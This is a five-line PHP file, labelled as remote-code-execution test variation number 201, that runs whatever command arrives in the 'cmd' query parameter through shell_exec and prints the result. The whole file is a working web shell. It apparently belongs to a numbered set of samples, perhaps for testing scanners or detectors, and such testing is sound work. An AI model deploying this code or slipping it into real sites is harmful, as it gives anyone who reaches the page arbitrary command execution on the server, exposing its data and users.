<?php
// RCE test variation #201
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>